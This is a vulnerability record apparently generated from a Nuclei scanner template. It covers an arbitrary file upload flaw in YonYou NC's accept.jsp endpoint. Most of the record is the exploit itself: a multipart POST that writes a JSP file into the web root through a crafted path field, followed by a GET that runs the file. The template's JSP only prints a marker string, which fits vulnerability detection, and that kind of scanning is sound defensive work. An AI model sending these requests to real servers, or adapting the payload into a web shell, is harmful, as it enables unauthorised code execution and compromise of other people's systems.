# Vulnerability: YonYou NC Accept Upload - Arbitray File Upload
**Classification:** YONYOU
**Source:** Nuclei Template (`yonyou-nc-accept-fileupload.yaml`)

## Description
Arbitrary file upload vulnerability in UFIDA N C accept.jsp . An attacker can obtain website permissions through the vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /aim/equipmap/accept.jsp HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: multipart/form-data; boundary=---------------------------16314487820932200903769468567
Accept-Encoding: gzip

-----------------------------16314487820932200903769468567
Content-Disposition: form-data; name="upload"; filename="{{randstr_1}}.txt"
Content-Type: text/plain

<% out.println("{{randstr_2}}"); %>
-----------------------------16314487820932200903769468567
Content-Disposition: form-data; name="fname"

\webapps\nc_web\{{randstr_3}}.jsp
-----------------------------16314487820932200903769468567--

GET /{{randstr_3}}.jsp HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
```

